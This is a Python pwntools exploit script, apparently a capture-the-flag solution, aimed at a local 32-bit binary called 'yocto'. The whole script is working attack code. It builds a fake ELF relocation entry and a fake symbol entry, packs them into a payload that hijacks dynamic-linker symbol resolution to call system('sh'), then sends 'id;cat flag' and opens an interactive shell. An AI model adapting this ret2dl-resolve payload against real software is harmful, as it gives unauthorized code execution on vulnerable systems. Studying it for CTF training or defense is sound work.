from pwn import *

s = process('./yocto')

# readelf -a ./yocto
STRTAB = 0x80481fc
SYMTAB = 0x804818c
JMPREL = 0x8048270

dynamic_linker = 0x80482a0
glob = 0x080495c0

rel_addr = glob + 20
system_addr = glob + 28
reloc_offset = rel_addr - JMPREL # 0x1364

# fake Elf32_Rel
rel = p32(0x8049544) # setvbuf global offset table
rel += p32(0x14607) # symtab 0x80495ec(sym_addr)-0x804818c(SYMTAB) = 0x1460 / relocate type 7

# fake SYMTAB
sym = p32(system_addr - STRTAB) # system\x00 offset

payload = '.' # first strchr()
payload += str(reloc_offset)
payload += '.' # second strchr()
payload += str(dynamic_linker) # eip
payload += ";sh;" # system(sh)
payload += '\x90'*(20 - len(payload)) # 20 byte
payload += rel # fake Elf32_Rel
payload += "system\x00" 
payload += "\x00"*9 # for indexing of SYMTAB table 
payload += sym # symtab

s.sendline(payload)
s.recv()
s.sendline('id;cat flag')
s.interactive()
